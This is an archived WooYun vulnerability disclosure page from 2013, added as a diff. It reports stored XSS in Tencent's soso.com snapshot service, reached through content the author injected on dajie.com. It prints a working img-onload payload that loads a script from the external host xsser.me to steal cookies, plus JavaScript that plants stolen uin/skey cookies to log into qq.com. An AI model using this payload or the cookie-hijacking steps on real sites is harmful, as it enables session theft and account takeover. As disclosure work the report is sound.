@@ -1,0 +1,227 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		名副其实的“跨”站脚本攻击，腾讯snapshot存在安全漏洞（无心插柳柳成荫2）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		名副其实的“跨”站脚本攻击，腾讯snapshot存在安全漏洞（无心插柳柳成荫2）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/px1624">px1624</a> 
+</li><li>提交时间：		2013-01-05 23:34</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-26：	细节向普通白帽子公开<br/>
+									2013-02-05：	细节向实习白帽子公开<br/>
+									2013-02-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">XSS了一下大街网，具体可以看 http://www.wooyun.org/bugs/wooyun-2013-016942，莫名其妙的XSS到了百度。看了下，原来是百度的某个功能不安全额。然后就联想到了腾讯，果然不出所料腾讯也中招了。剑心不要说我在刷rank哦。。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1 都是快照惹的祸，莫名其妙的xss到了百度，就想到腾讯soso，不过腾讯soso的抓数据真心比百度弱好多，等了一天，终于抓到了数据，直接以快照模式打开。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0523183676ac3ec318411b915b8bf2c2fef9300a.jpg" target="_blank"><img src="../images/0523183676ac3ec318411b915b8bf2c2fef9300a.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+测试地址：</p><pre><code>http://snapshot.soso.com/snap.cgi?d=1747679200769378085&amp;w=%A1%BE%BE%AB%BB%AA%A3%AC%BB%F0%A1%BF%D3%D0%CD%BC%D3%D0%D5%E6%CF%E0%A3%AC%B7%C7%C4%E3%C4%AA%CA%F4%CF%D6%B3%A1%A3%AC%B0%D4%C6%F8%CD%FE%CE%E4%A3%AC%B8%F8%C1%A6%B0%A1%A3%A1&amp;u=http://feinimoshu.dajie.com/discuss/topic/162247/detail</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2 可以看到域名是腾讯soso的，进入地址后用F12查看，之前在那里插入的恶意代码没有过滤。<br />
+<br />
+<br />
+<br />
+代码：</p><pre><code>&lt;img src=&quot;http://fs3u.dajie.com/2013/01/04/117/13573151176041810m.png&quot; onload=&quot;s=document.createElement(&#039;script&#039;);s.src=&#039;http://xsser.me/6Y3Mpn?&#039;+Math.random();document.body.appendChild(s)&quot; border=&quot;0&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/05230642bc3604215b2c27780d005da8b6aad985.jpg" target="_blank"><img src="../images/05230642bc3604215b2c27780d005da8b6aad985.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以成功盗取登录cookie。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/05230700a03b86b6f5096fc543a0223b07194eb5.jpg" target="_blank"><img src="../images/05230700a03b86b6f5096fc543a0223b07194eb5.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3 如图成功的盗取了soso.com域名下的cookie，并且测试可以登录成功soso，但是由于跨域并不能登录qq.com<br />
+<br />
+<br />
+<br />
+观察后发现，soso.com下的skey和qq.com下是一样的，所以只需要写入以下代码就可以了。（可以直接用调试工具执行js代码）<br />
+<br />
+<br />
+<br />
+</p><pre><code>document.cookie=&quot;uin=xxx; domain=qq.com&quot;;<br />
+document.cookie=&quot;skey=yyy; domain=qq.com&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+其中xxx和yyy可以通过soso下抓到的cookie进行提取。<br />
+<br />
+<br />
+<br />
+已测试可以顺利登录qq.com域名下的网站了。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+4 同理如果其他站有XSS的话，soso快照还是会中招。可以自己XSS自己网站，然后通过soso快照去XSS腾讯搜搜。可以说是普遍撒网，特殊捞鱼。<br />
+<br />
+<br />
+<br />
+5 soso快照中招了，可以用上面方法登录qq.com，既然能登陆qq.com了，就可以想干嘛干嘛 了，所以危害可想而知了。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>http://snapshot.soso.com/snap.cgi?d=1747679200769378085&amp;w=%A1%BE%BE%AB%BB%AA%A3%AC%BB%F0%A1%BF%D3%D0%CD%BC%D3%D0%D5%E6%CF%E0%A3%AC%B7%C7%C4%E3%C4%AA%CA%F4%CF%D6%B3%A1%A3%AC%B0%D4%C6%F8%CD%FE%CE%E4%A3%AC%B8%F8%C1%A6%B0%A1%A3%A1&amp;u=http://feinimoshu.dajie.com/discuss/topic/162247/detail</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+也不知道你们这soso快照的有效期是多久，原帖我已经通知大街网给删了。。。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过年了，本命年求个礼物冲冲喜。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/px1624" title="px1624">px1624</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016968" title="名副其实的“跨”站脚本攻击，腾讯snapshot存在安全漏洞（无心插柳柳成荫2）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-01-06 10:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。我们会马上安排专人跟进确认处理，有新的情况会及时同步</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16968";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
